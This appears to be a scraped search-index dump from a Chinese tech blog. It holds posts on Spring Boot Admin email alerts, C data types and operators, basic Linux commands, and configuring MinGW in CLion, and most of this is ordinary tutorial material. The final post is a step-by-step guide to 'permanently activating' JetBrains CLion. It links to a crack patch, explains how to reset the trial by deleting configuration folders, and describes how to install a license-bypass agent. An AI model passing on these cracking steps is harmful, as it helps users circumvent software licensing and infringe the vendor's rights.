&lt;artifactId&gt;spring-boot-starter-mail&lt;/artifactId&gt;&lt;/dependency&gt; 在 Admin Server 的 application.yml 配置文件中，添加邮件相关的配置内容，其中 username 与 notify.mail.from 的内容必须一致： 123456789101112spring: mail: port: 25 host: smtp.qq.com username: 158747124@qq.com password: xxxxxxx boot: admin: notify: mail: to: 389723578@qq.com from: 158747124@qq.com 由于国内腾讯云、阿里云默认封了 25 端口，若项目是部署在云服务器，使用上述的配置是无法正常发送邮件的，需要更改为使用 465 端口，并启用 SSL 邮件加密，最后系统防火墙别忘了开放 465 端口，配置示例如下： 12345678910111213141516171819202122232425spring: mail: port: 465 protocol: smtp host: smtp.qq.com username: 158747124@qq.com password: xxxxxxx properties: mail: smtp: auth: true socketFactory: port: 465 class: javax.net.ssl.SSLSocketFactory ssl: enable: true starttls: enable: true required: true boot: admin: notify: mail: to: 389723578@qq.com from: 158747124@qq.com 以上配置，当已注册的服务的状态从 UP 变为 OFFLINE 或其他状态时，Admin Server 会自动将告警邮件发送到对应的邮箱，更多邮箱相关的配置示例如下： 123456789101112131415161718192021222324252627spring.mail.host=smtp.qq.comspring.mail.username=xx@qq.comspring.mail.password=xxxxxxspring.mail.properties.mail.smtp.auth=truespring.mail.properties.mail.smtp.starttls.enable=truespring.mail.properties.mail.smtp.starttls.required=truespring.mail.properties.mail.smtp.ssl.enable=truespring.mail.properties.mail.smtp.socket.factory.class=javax.net.ssl.SSLSocketFactoryspring.mail.properties.mail.smtp.socket.factory.fallback=falsespring.mail.properties.mail.smtp.port=465spring.mail.properties.mail.transport.protocol=smtp#需要忽略的状态改变通知，逗号分隔,例如不通知离线到上线的状态，则填写为OFFLINE:UP#spring.boot.admin.notify.mail.ignore-changes=#接收通知的邮箱地址，逗号分隔spring.boot.admin.notify.mail.to=yangzhilong@qq.com#需要抄送的邮箱地址，逗号分隔#spring.boot.admin.notify.mail.cc=test1@qq.com#邮件发送者,大部分情况与登录名相同spring.boot.admin.notify.mail.from=${spring.mail.username}#邮件主题，默认是：#{application.name} (#{application.id}) is #{to.status}spring.boot.admin.notify.mail.subject=${spring.profiles.active} profile\'s #{application.name} (#{application.id}) is #{to.status}#邮件内容，默认是：#{application.name} (#{application.id})\\nstatus changed from #{from.status} to #{to.status}\\n\\n#{application.healthUrl}spring.boot.admin.notify.mail.text=${spring.profiles.active} profile\'s #{application.name} (#{application.id})\\nstatus changed from #{from.status} to #{to.status}#Comma-delimited list of status changes to be ignored. Format: "&lt;from-status&gt;:&lt;to-status&gt;". Wildcards allowed.默认值："UNKNOWN:UP"#spring.boot.admin.notify.mail.ignore-changes= 7、参考资料 Spring Boot 使用 QQ 邮箱发邮件 Spring Boot Admin 在线日志配置 Spring Boot Admin 2.1.0 全攻略 SpringBoot（2.1.1）监控管理及性能调优 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"C 语言语法之一数据类型与运算符",url:"/posts/168c8788.html",text:'数据类型数据类型概览 常量与变量对于基本数据类型量，按其取值是否可改变又分为常量和变量两种。在程序执行过程中，其值不发生改变的量称为常量，其值可变的量称为变量。它们可与数据类型结合起来分类，例如可分为整型常量、整型变量、浮点常量、浮点变量、字符常量、字符变量、枚举常量、枚举变量。在程序中，常量是可以不经说明而直接引用的，而变量则必须先定义后使用。（整型量包括整型常量、整型变量） 符号常量在 C 语言中，可以用一个标识符来表示一个常量，称之为符号常量。符号常量在使用之前必须先定义，其一般定义形式为：#define 标识符 常量。其中 #define 也是一条预处理命令（预处理命令都以”#” 开头），称为宏定义命令，其功能是把该标识符定义为其后的常量值。一经定义，以后在程序中所有出现该标识符的地方均代之以该常量值。习惯上符号常量的标识符用大写字母，变量标识符用小写字母，以示区别。 整型常量的表示方法整型常量就是整常数，在 C 语言中，使用的整常数有十进制、八进制和十六进制三种： 十进制整常数：十进制整常数没有前缀，其数码为 0～9，以下各数是合法的十进制整常数：237、-568、65535、1627 八进制整常数：八进制整常数必须以 0 开头，即以 0 作为八进制数的前缀，数码取值为 0～7，八进制数通常是无符号数。 以下各数是合法的八进制数： 015 (十进制为 13)、0101 (十进制为 65)、0177777 (十进制为 65535) 十六进制整常数：十六进制整常数的前缀为 0X 或 0x，其数码取值为 09，AF 或 a~f。 以下各数是合法的十六进制整常数： 0X2A (十进制为 42)、0XA0 (十进制为 160)、0XFFFF (十进制为 65535) 整型常数的后缀：在 16 位字长的机器上，基本整型的长度也为 16 位，因此表示的数的范围也是有限定的。十进制无符号整常数的范围为 0～65535，有符号数为 - 32768～+32767。八进制无符号数的表示范围为 0～0177777。十六进制无符号数的表示范围为 0X0～0XFFFF 或 0x0～0xFFFF。如果使用的数超过了上述范围，就必须用长整型数来表示，长整型数是用后缀 “L” 或 “l” 来表示的。 整型变量的分类注意：整型变量占多少个字节，这个跟系统和编译器的规定有关！ 基本型：类型说明符为 int，在内存中占 4 个字节 短整型：类型说明符为 short int 或 short，在内存中占 2 个字节 长整型：类型说明符为 long int 或 long，在内存中占 8 个字节 无符号型：类型说明符为 unsigned，在内存中占 4 个字节 整型变量在内存中的存放形式内存中的整型变量以二进制存储，一个字节 (byte) = 8 位 (bit)。其中数值是以补码表示，正数的补码和原码相同，负数的补码则是将该数的绝对值的二进制形式按位取反再加一。 1234567例如：求-10的补码10的原码： 00001010取反： 11110101再加1，得-10的补码： 11110110提示：第一位是符号位！ 实型常量的表示方法实型也称为浮点型，实型常量也称为实数或者浮点数。在 C 语言中，浮点数只采用十进制表示，其中有二种形式：十进制小数形式、指数形式。标准 C 语言允许浮点数使用后缀，后缀为 “f” 或 “F” 即表示该数为浮点数，如 356f 和 356. 是等价的。 十进制数形式：由数码 0~ 9 和小数点组成，例如 0.0、25.0、5.789、0.13、5.0、300.、-267.8230 等均为合法的实数 (必须有小数点) 指数形式：由十进制数、阶码标志 “e” 或 “E”、阶码 (只能为整数，可以带符号) 组成，其一般形式为：a E n（a 为十进制数，n 为十进制整数），例如 2.1E5 (等于 2.1105)、-2.8E-2 (等于 - 2.810-2)、0.5E7 (等于 0.5*107) 实型变量的分类实型变量分为：单精度（float 型）、双精度（double 型）和长双精度（long double 型）三类。在 Turbo C 中单精度型占 4 个字节（32 位）内存空间，其数值范围为 3.4E-38～3.4E+38，只能提供七位有效数字。双精度型占 8 个字节（64 位）内存空间，其数值范围为 1.7E-308～1.7E+308，可提供 16 位有效数字。 实型变量在内存中的存放形式实型变量一般占 4 个字节 (32 位) 的内存空间，按指数形式存储，实数 3.14159 在内存中的存放形式如下： 小数部分占的位 (bit) 数愈多，数的有效数字愈多，精度愈高 指数部分占的位数愈多，则能表示的数值范围愈大 字符常量字符常量是用单引号括起来的一个字符，例如：’a’、’b’、’=’、’+’、’?’都是合法字符常量。在 C 语言中，字符常量有以下特点： 字符常量只能用单引号括起来，不能用双引号或其它括号 字符常量只能是单个字符，不能是字符串 字符可以是字符集中任意字符，但数字被定义为字符型之后就不能参与数值运算。例如’5’和 5 是不同的，’5’是字符常量，不能参与运算 转义字符转义字符是一种特殊的字符常量，转义字符以反斜线”" 开头，后面跟一个或几个字符。转义字符具有特定的含义，不同于字符原有的意义，故称 “转义” 字符。例如 printf 函数的格式串中用到的 \\n 就是一个转义字符，其意义是 “回车换行”。转义字符主要用来表示那些用一般字符不便于表示的控制代码。 字符变量字符变量用来存储字符常量，即单个字符。字符变量的类型说明符是 char，字符变量类型定义的格式和书写规则都与整型变量相同。例如：char a, b; 字符变量在内存中的存放形式每个字符变量被会被分配一个字节的内存空间，因此只能存放一个字符。字符值是以 ASCII 码的形式存放在变量的内存单元之中的，如 x 的十进制 ASCII 码是 120，y 的十进制 ASCII 码是 121。若对字符变量 a、b 分别赋予’x’和’y’值：a =‘x’; b = \'y\';，实际上是在 a、b 两个单元内存放 120 和 121 的二进制值。 字符串常量字符串常量是由一对双引号括起的字符序列，例如：”CHINA”、”C program” 等都是合法的字符串常量。字符串常量和字符常量是不同的量，它们之间主要有以下区别： 字符常量由单引号括起来，字符串常量由双引号括起来 字符常量只能是单个字符，字符串常量则可以含一个或多个字符 可以把一个字符常量赋予一个字符变量，但不能把一个字符串常量赋予一个字符变量，例如：可以是 char a = ‘a’ 但不能是 char a = “a” 字符常量占一个字节的内存空间，字符串常量占的内存字节数等于字符串的字节数加一，额外增加的一个字节用于存放字符 \\0 (ASCII 码为 0)，这是字符串的结束标志 运算符各类数值型数据之间的混合运算变量的数据类型是可以转换的，转换的方法有两种，一种是自动转换，一种是强制转换。自动转换发生在不同数据类型的量混合运算时，由编译系统自动完成。自动转换遵循以下规则： 若参与运算量的类型不同，则先转换成同一类型，然后进行运算 转换按数据长度增加的方向进行，以保证精度不降低，如 int 型和 long 型运算时，先把 int 量转成 long 型后再进行运算 所有的浮点运算都是以双精度进行的，即使仅含 float 单精度量运算的表达式，也要先转换成 double 型，再作运算 char 型和 short 型参与运算时，必须先转换成 int 型 在赋值运算中，赋值号两边量的数据类型不同时，赋值号右边量的类型将转换为左边量的类型。如果右边量的数据类型长度比左边长时，将丢失一部分数据，这样会降低精度，丢失的部分按四舍五入向前舍入，类型自动转换的规则为：double &lt;- long &lt;- unsigned &lt;- int &lt;- char、short 自动类型转换如果赋值运算符两边的数据类型不相同，系统将自动进行类型转换，即把赋值号右边的类型换成左边的类型，具体规定如下： 实型赋予整型，舍去小数部分 整型赋予实型，数值不变，但将以浮点形式存放，即增加小数部分 (小数部分的值为 0) 字符型赋予整型，由于字符型为一个字节，而整型为四个字节，故将字符的 ASCII 码值放到整型量的低八位中，高八位为 0。整型赋予字符型，只把低八位赋予字符量 强制类型转换强制类型转换是通过类型转换运算来实现的，其一般形式为：(类型说明符) (表达式)，其功能是把表达式的运算结果强制转换成类型说明符所表示的类型。例如： (float) a 表示把 a 转换为浮点型，(int)(x+y) 表示把 x+y 的结果转换为整型，在使用强制转换时应注意以下问题： 类型说明符和表达式都必须加括号 (单个变量可以不加括号)，如把 (int)(x+y) 写成 (int)x+y 则成了把 x 转换成 int 型之后再与 y 相加了 无论是强制转换或是自动转换，都只是为了本次运算的需要而对变量的数据长度进行的临时性转换，而不改变数据说明时对该变量定义的类型 基本的算术运算符 加法运算符 “+”：加法运算符为双目运算符，即应有两个量参与加法运算。如 a+b, 4+8 等，具有右结合性 减法运算符 “-”：减法运算符为双目运算符，但 “-” 也可作负值运算符，此时为单目运算，如 - x, -5 等，具有左结合性 乘法运算符 “*”：双目运算，具有左结合性 除法运算符 “/”：双目运算，具有左结合性，参与运算量均为整型时，结果也为整型，舍去小数部分；如果运算量中有一个是实型，则结果为双精度实型 运算符的优先级与结合性 运算符的优先级：C 语言中，运算符的运算优先级共分为 15 级。1 级最高，15 级最低。在表达式中，优先级较高的先于优先级较低的进行运算。而在一个运算量两侧的运算符优先级相同时，则按运算符的结合性所规定的结合方向处理 运算符的结合性：C 语言中各运算符的结合性分为两种，即左结合性 (自左至右) 和右结合性 (自右至左)。例如算术运算符的结合性是自左至右，即先左后右。如有表达式 x-y+z 则 y 应先与 “-” 号结合，执行 x-y 运算，然后再执行 + z 的运算，这种自左至右的结合方向就称为 “左结合性”。而自右至左的结合方向称为 “右结合性”。 最典型的右结合性运算符是赋值运算符，如 x=y=z，由于 “=” 的右结合性，应先执行 y=z 再执行 x=(y=z) 运算。C 语言运算符中有不少为右结合性，应注意区别，以避免理解错误 运算符优先级与结合性一览表点击查看运算符优先级与结合性一览表，表中可以总结出如下规律： 结合方向只有三个是从右往左，其余都是从左往右 所有双目运算符中只有赋值运算符的结合方向是从右往左 另外两个从右往左结合的运算符也很好记，因为它们很特殊：一个是单目运算符，一个是三目运算符 C 语言中有且只有一个三目运算符 逗号运算符的优先级最低，要记住 对于优先级：算术运算符 &gt; 关系运算符 &gt; 逻辑运算符 &gt; 赋值运算符，逻辑运算符中 “!” 除外 自增、自减运算符 自增 1 运算符：记为 ++，其功能是使变量的值自增 1 自减 1 运算符：记为 --，其功能是使变量值自减 1 自增 1，自减 1 运算符均为单目运算，都具有右结合性，可有以下几种形式：++i，i 自增 1 后再参与其它运算--i，i 自减 1 后再参与其它运算i++，i 参与运算后，i 的值再自增 1i--，i 参与运算后，i 的值再自减 1 1234567int i = 8;printf("%d\\n",++i); // 打印9，此时i=9printf("%d\\n",--i); // 打印8，此时i=8printf("%d\\n",i++); // 打印8，此时i=9printf("%d\\n",i--); // 打印9，此时i=8printf("%d\\n",-i++); // 打印-8，此时i=9printf("%d\\n",-i--); // 打印-9，此时i=8 赋值运算符和赋值表达式 赋值运算符记为 “=”，由 “=” 连接的式子称为赋值表达式，其一般表现形式为： 变量 = 表达式，例如 x = a + b 赋值表达式的功能是计算表达式的值再赋予左边的变量，因此赋值运算符具有右结合性，例如 a=b=c=5 可理解为 a=(b=(c=5)) 复合的赋值运算符 在赋值符 “=” 之前加上其它二目运算符可构成复合赋值符，例如 +=、-=、*=、/=、%=、&lt;&lt;=、&gt;&gt;=、&amp;=、^=、|= 复合赋值符这种写法，十分有利于编译处理，能提高编译效率并产生质量较高的目标代码，例如 a+=5 等价于 a=a+5，r%=p 等价于 r=r%p 本节重点内容 整型变量在内存中的存放形式 实型变量在内存中的存放形式 字符变量在内存中的存放形式 各类数值型数据之间的混合运算 自动类型转换 运算符的优先级与结合性 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c语言"},{title:"Linux 必要命令摘要",url:"/posts/817c7d82.html",text:"",tags:"在线电子书"},{title:"Linux 系统编程之三 - 系统常用命令",url:"/posts/2db9f8a1.html",text:'命令格式Linux 命令的格式：command [-options] [parameter1] ... command：命令名称，相应功能的英文单词或单词的缩写 [-options]：选项，可用来对命令进行控制，也可以省略，[] 代表可选 parameter1 ...：命令的参数，可以是零个、一个或者多个 基础命令管道 |管道，也就是一个命令的输出可以通过管道做为另一个命令的输入。简单概括，管道可以理解现实生活中的管子，管子的一头塞东西进去，另一头取出来，这里 | 的左右分为两端，左端塞东西（写），右端取东西（读）。 1$ ls -alh | more 清屏 clearclear 作用为清除终端上的显示（类似于 DOS 的 cls 清屏功能），也可使用快捷键：ctrl + l。 1$ clear 输出重定向 &gt;Linux 允许将命令执行结果重定向到一个文件，本应显示在终端上的内容保存到指定文件中。&gt; 输出重定向会覆盖原来的内容，&gt;&gt; 输出重定向则会将内容追加到文件的尾部。 12345# 覆盖文件内容$ ls &gt; abc.txt# 追加文件内容$ date &gt;&gt; abc.txt 切换工作目录 cd在使用 Unix/Linux 的时候，经常需要更换工作目录，cd 命令可以帮助用户切换工作目录。Linux 所有的目录和文件名都区分大小写。cd 命令后面可跟绝对路径，也可以跟相对路径；如果省略目录，则默认切换到当前用户的主目录。 显示当前路径 pwd使用 pwd 命令可以显示当前的工作目录，该命令很简单，直接输入 pwd 即可，后面不带参数。 查看命令位置 whichwhich 命令可以用来查看特定命令的具体位置。 12# 查看ls命令的位置$ which ls 帮助文档查看帮助文档 manman 是 Linux 提供的一个帮助手册命令，可以查看绝大部分命令、函数的使用说明。该帮助手册分成很多章节（section），使用 man 命令时可以指定不同的章节来浏览不同的内容。各个章节（section）的含义如下： 1．Standard commands（标准命令） 2．System calls（系统调用，如 open,write） 3．Library functions（库函数，如 printf,fopen） 4．Special devices（设备文件的说明，/dev 下各种设备） 5．File formats（文件格式，如 passwd） 6．Games and toys（游戏和娱乐） 7．Miscellaneous（杂项、惯例与协定等，例如 Linux 档案系统、网络协定、ASCII 码；environ 全局变量） 8．Administrative Commands（管理员命令，如 ifconfig） man 命令的使用格式是：man [选项] 命令名称，例如查看 ls 命令的用法可以使用：man 1 ls，其中 1 是数字，代表第 1 个 章节（section）。实际上，一般不用指定第几个章节也可以正常查看，例如 man ls。但是有一种情况除外，假如命令的名称和函数的名称刚好相同（如：printf），它既是命令，也可以是库函数；如果不指定章节号直接使用 man printf，那么它只能查看命令的用法，不能查看函数的用法，因为 man 命令是按照手册的章节号的顺序进行搜索的。man 命令设置了如下的功能键： 查看帮助文档 - -help--help 一般是 Linux 命令自带的选项，但并不是所有命令都自带这个选项，例如以下命令可以查看 ls 命令的帮助文档： 1$ ls --help 文件管理查看文件列表 lsls 是英文单词 list 的简写，其功能为列出目录的内容，是用户最常用的命令之一，它类似于 DOS 系统下的 dir 命令。Linux 文件或者目录名称最长可以有 256 个字符，. 代表当前目录，.. 代表上一级目录，以 . 开头的文件为隐藏文件，需要用 -a 参数才能显示。 与 DOS 系统下的文件操作类似，在 Unix/Linux 系统中，也同样允许使用特殊字符来同时引用多个文件名，这些特殊字符被称为 通配符。 创建目录 mkdir通过 mkdir 命令可以创建一个新的目录，参数 -p 可递归创建目录。需要注意的是，新建目录的名称不能与当前目录中已有的目录或文件同名，并且目录创建者必须对当前目录具有写权限。 123$ mkdir www$ mkdir -p www/nginx/ 删除目录 rmdir可使用 rmdir 命令删除一个目录，但必须离开目录，并且目录必须为空目录，不然会提示删除失败 删除文件 rm可通过 rm 命令删除文件或目录。使用 rm 命令要特别小心，因为文件删除后不能恢复。为了防止文件误删，可以在 rm 命令后使用 -i 参数以逐个确认要删除的文件。结合 -r 参数，可以递归删除非空目录里的所有文件和文件夹。 123$ rm run.log$ rm -rf /www/share/ 拷贝文件 cpcp 命令的功能是将给出的文件或目录复制到另一个文件或目录中，相当于 DOS 下的 copy 命令。 移动文件 mv用户可以使用 mv 命令来移动文件或目录，也可以给文件或目录重命名。 12345678# 文件重命名$ mv run.log runtime.log# 移动文件$ mv /tmp/run.log /usr/local/share/# 移动目录$ mv /tmp/share/ /usr/local/share/ 创建文件 touchtouch 命令用于修改文件或者目录的时间属性，包括存取时间和更改时间，若文件不存在，则会创建一个新的文件。命令格式为： touch [-acfm] [-d&lt;日期时间&gt;] [-r&lt;参考文件或目录&gt;] [-t&lt;日期时间&gt;] [--help] [--version][文件或目录...] -a：更改文件的读取时间记录 -m：更改文件的修改时间记录 -c：假如指定的文件不存在，不会创建新的文件，与 --no-create 的效果一样 -f：可忽略不使用，是为了与其他 Unix 系统的相容性而保留 -r：使用其他文件的时间信息，而不是当前系统时间 -d：设定时间与日期，可以使用各种不同的格式 -t：设定文件的时间信息，格式与 date 命令相同 --no-create：不创建新的文件 12# 修改文件时间属性为当前系统时间$ touch testfile 值得一提的是，使用 touch 命令时，如果指定的文件不存在，则将创建一个新的空白文件。例如，在当前目录下，使用该指令创建一个空白文件 newfile，可以使用如下命令： 1$ touch newfile 建立链接文件 lnLinux 的链接文件类似于 Windows 下的快捷方式，链接文件分为 软链接 和 硬链接: 硬链接：硬链接只能链接普通文件，不能链接目录，命令格式：ln 源文件 链接文件 软链接：软链接不占用磁盘空间，源文件删除则软链接失效，命令格式：ln -s 源文件 链接文件 1$ ln -s /bin/less /usr/local/bin/less 如果没有 -s 选项则代表建立一个硬链接文件，两个文件占用相同大小的硬盘空间，即使删除了源文件，链接文件还是存在，所以 -s 选项是更常见的使用形式。特别注意，如果软链接文件和源文件不在同一个目录，源文件要使用绝对路径，不能使用相对路径。 获取文件类型 fileLinux 系统文件类型不是根据文件扩展名分类的，通过 file 命令可以确认文件的具体类型。 1$ file run.log 文件内容搜索 grepLinux 系统中的 grep 命令是一种强大的文本搜索工具，grep 命令允许对文本文件进行模式查找。如果找到匹配模式，grep 命令会打印包含模式的所有行。grep 命令的格式为 grep [-选项] "搜索内容" 文件名。 12345678# 在文件中搜索字符串$ grep "time" /tmp/run.log# 在文件中搜索字符串，不区分大小写$ grep -i "time" /tmp/run.log# 在文件中搜索字符串，不区分大小写，显示行号$ grep -i -n "time" /tmp/run.log 值得一提的是，在 grep 命令中输入字符串参数时，最好使用引号或双引号括起来，例如：grep "a" run.log。 计算文件行数或字数 wc 1234567891011 # 统计文件行数 $ wc -l run.log# 统计文件字数$ wc -w run.log# 统计文件字节数$ wc -c run.log# 统计文件字符数$ wc -m run.log 分页显示文件内容 more查看内容时，在信息过长无法在一屏上显示时，会出现快速滚屏，使得用户无法看清文件的内容。此时可以使用 more 命令，每次只显示一页，按下 空格键 可以显示下一页，按下 回车键 可以显示下一行，按下 q 键退出显示，按下 h 键可以获取帮助。 1$ more README.md 查看或者合并文件内容 cat12345# 查看文件内容$ cat 1.log# 合并文件内容$ cat 1.log 2.log &gt; 3.log 文件压缩解压 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux系统编程"},{title:"Windows 系统下 CLion 配置 MinGW",url:"/posts/60b40ee7.html",text:'MinGW 介绍MinGW 的简介MinGW 是 Minimalist GNU on Windows 的缩写。它是一个可自由使用和自由发布的 Windows 特定头文件和使用 GNU 工具集导入库的集合，允许开发者在 Linux 和 Windows 平台生成本地的 Windows 程序而不需要第三方 C 运行时（C Runtime）库。MinGW 实际上是将经典的开源 C 语言编译器 GCC 移植到了 Windows 平台下，并且包含了 Win32API 和 MSYS，因此可以将源代码编译生成 Windows 下的可执行程序，又能如同在 Linux 平台下时，使用一些 Windows 不具备的开发工具。简单一句话概况，MinGW 就是 GCC 的 Windows 版本 。 MinGW 的优势 MinGW 支持最新的 C 语言 标准 MinGW 是开源软件，可以免费使用 MinGW 由一个活跃的开源社区在持续维护，因此不会过时 MinGW 使用 Windows 的 C 语言运行库，因此编译出的程序不需要第三方 DLL ，可以直接在 Windows 下运行 那些著名的开源 IDE 实际只是将 MinGW 封装了起来，使它拥有友好的图形化界面，简化了操作，但内部核心仍然是 MinGW MinGW 是稳定可靠的、持续更新的 C/C++ 编译器，使用它可以免去很多麻烦，不用担心跟不上时代，也不用担心编译器本身有严重漏洞，可以放心的去编写程序。 MinGW 安装管理器下载 MinGW 安装管理器浏览器访问 这里，下载最新版本的 MinGW 安装管理器 mingw-get-setup.exe 安装 MinGW 安装管理器 使用系统管理员权限运行 mingw-get-setup.exe 选择 MinGW 安装管理器的安装位置 开始下载 MinGW 安装管理器，一般来说并不会花费太长时间，在数分钟范围内即可完成 MinGW 组件安装MinGW 安装管理器安装完成后，会在桌面创建一个快捷方式，以后只要双击它就可以启动 MinGW 安装管理器，这样就可以很方便地管理 MinGW 已安装的组件，或者添加安装新的组件 界面介绍一般来说，只需要一些基础组件就可以满足编译 C/C++ 程序的需求，所以选择左侧目录中的第一项 Basic Setup 即可，之后就可以在右侧选择需要的组件了 勾选组件在组件上单击鼠标右键，然后在弹出的右键菜单中单击 Mark for Installation 选项，即可将组件进行标记。在之后的操作完成后，管理器将会自动安装被标记了的组件 选择组件如果只是为了编译 C/C++ 程序，那么只需安装 mingw-developer-toolkit、mingw32-base、mingw32-gcc-g++、msys-base 这 4 个基础组件即可 应用更改在上述所需的 4 个基础组件都已勾选完成后，单击菜单栏上的 Installation 选项，并在弹出的菜单中单击 Apply Changes 选项 确认安装在弹出的确认窗口里，直接单击 Apply 按钮，之后安装管理器就会真正地开始下载和安装 MinGW 了 MinGW 安装管理器会一边下载一边安装 MinGW，这一过程可能会花费很长的时间。由于 MinGW 安装管理器连接的是国外的服务器，这会导致下载速度缓慢，所以需要耐心地等待一段时间 安装完成 检查更新 已安装组件 MinGW 环境变量配置安装目录结构MinGW 安装后，本地磁盘的目录结构如下，默认安装路径是 C:\\MinGW\\ 添加环境变量将 MinGW 安装目录下 bin 目录的路径添加到系统的环境变量中 验证环境变量在打开的命令提示符窗口中，输入 gcc -v ，然后按回车键（Enter），若控制台正确输出 GCC 的版本信息，则说明已正确配置 MinGW 的环境变量 CLion 配置 MinGWCLion 的安装可以参考本站教程：JetBrains-CLion 永久激活 创建 CMake 项目若是 C++ 项目，则选择 C++ Executable，若是 C 语言项目，则选择 C Executable，然后选择项目路径即可 配置工具链进入 CLion 工具链的配置界面，点击左侧的 + 号，环境选择 MinGW 选择 MinGW 的安装路径，一般情况下，设置好 MinGW 的安装路径后，CLion 会自动探测 CMake、Make、C Compiler 和 C++ Compiler 对应的可执行程序，但速度略慢，可等待探测完成，也可手动选择可执行文件 编译程序选中需要编译和运行的 C/C++ 源文件，然后点击 绿色箭头，这就可以编译和运行 C/C++ 程序了，程序成功运行后，会在 CLion 的输出窗口打印运行结果 参考博客 MinGW 安装教程 MinGW 离线安装包下载 Cygwin 和 MinGW 的区别与联系是怎样的 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"JetBrains-CLion 永久激活教程",url:"/posts/c0477083.html",text:'最新公告本文适用于 JetBrains CLion v2019.3/3.1/3.2/3.3 永久激活，若你使用的是更新的版本，建议参考这篇博客，使用最新的方式来破解。 前言JetBrains CLion 是一款专为 C/C++ 开发所设计的跨平台 IDE。本文适用 JetBrains CLion v2019.3/3.1/3.2/3.3 永久激活，附破解补丁和激活码，可以永久激活 Windows、MAC、Linux 下的 CLion！！！网上有激活码的激活方式（更改 hosts），一般都是几个月或者一年，但下面介绍的方法是永久激活，亲测可以激活成功。JetBrains CLion v2019.3.4 以及之后的版本暂时只支持默认的 License Server 激活方式，望周知。 资源下载 JetBrains CLion 下载：官网 JetBrains CLion&nbsp;破解补丁下载：本站 JetBrains CLion&nbsp;破解补丁下载：百度网盘 提取码：u3pe Clione 激活第一步更改 hosts 文件，将 hosts 文件中有关 Jetbrains 的配置行全部删除掉，若没有则请忽略此步骤。Windows 系统的 hosts 文件路径为：C:\\Windows\\System32\\drivers\\etc\\hosts，Linux 和 Mac 系统的 hosts 文件路径为：/etc/hosts，一般情况下只需删除以下两行内容即可： 120.0.0.0 www.jetbrains.com0.0.0.0 account.jetbrains.com 第二步下载安装 JetBrains CLion，然后启动 CLion 并选择试⽤（Evaluate for free）模式进⼊软件（如下图），首次启动后的配置项根据自己的需要勾选，此步骤不会影响后面破解的过程。假设软件之前已经在试用或者试用过而且过期了，那么可以先删除 CLion 的所有配置文件，然后再重新启动软件，CLion 配置文件所在的目录如下： 123456789# Windows系统C:\\Documents and Settings\\Administrator\\.clion-2019.3.3\\configC:\\Documents and Settings\\Administrator\\.clion-2019.3.3\\system# Linux/Mac系统~/.CLion2019.3/config~/.CLion2019.3/system~/.config/JetBrains #此目录仅供参考，勿随便删除~/.local/share/JetBrains #此目录仅供参考，勿随便删除 第三步JetBrains CLion 启动后（试用模式），手动选择创建或者打开一个项目，进入到 CLion 的主界面。然后解压破解补丁压缩包（解压路径不能包含中文字符），将破解补丁文件 jetbrains-key.jar 拖进 CLion 的主界面，根据提示点击 Restart 按钮重启软件（如下图）。 第四步JetBrains CLion 重启完成后，在弹出的 JetbrainsAgent 配置助手对话框中选择对应的激活方式，然后点击安装按钮即可（如下图）。如果是⽆外网环境（银行、公安内网），请在对话框中选择 Activation code 激活方式和勾选 我⽆法访问外网的选项，一般情况下只需要选择 Activation code 激活方式即可。最后根据提示窗口，再次重启 CLion 即可完成所有破解步骤。 第五步查看是否破解成功，CLion 的菜单栏导航到 Help –&gt; About，若出现下图的信息则说明破解成功。 CLion 支持的工具链Windows 平台下，CLion 支持的工具链包括：MinGW、Cygwin、Visual Studio、WSL、Remote Host，其中 MinGW 的使用可以参考本站教程： CLion 配置 MinGW 背后的原理分析（可忽略）注：使用本文提供的破解补丁时，一定要使用上面提到的方法（拖拽破解补丁文件到 CLion 的主界面）来破解 CLion，否则破解会失败。 1234561. 将破解补丁解压目录下的important.txt、jetbrains-key.jar文件拷贝到~/.jetbrains目录~/.jetbrains/important.txt~/.jetbrains/jetbrains-agent-v3.0.3.ed81.6052. 